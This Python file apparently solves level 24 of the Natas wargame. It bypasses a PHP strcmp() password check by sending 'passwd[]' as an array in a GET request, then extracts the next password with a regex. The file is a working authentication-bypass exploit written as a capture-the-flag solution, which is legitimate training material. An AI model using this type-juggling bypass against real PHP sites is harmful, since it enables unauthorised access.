import re
from src.natas.base_level import NatasLevel

class Level_24(NatasLevel):

  num = 24
  explanation = "On this level, `strcmp()` returns `NULL` when given an array instead of a string,\n     which PHP treats as 0 in the comparison. We pass `passwd[]` as an array to bypass the check."

  def exploit(self) -> str:

    resp  = self.session.get(self.base_url + "/index.php?passwd[]=anything")
    match = re.search(r'Password: (.*)[a-zA-Z0-9]', resp.text, re.MULTILINE).group().replace("Password:", "").replace("</pre", "").strip()

    return match
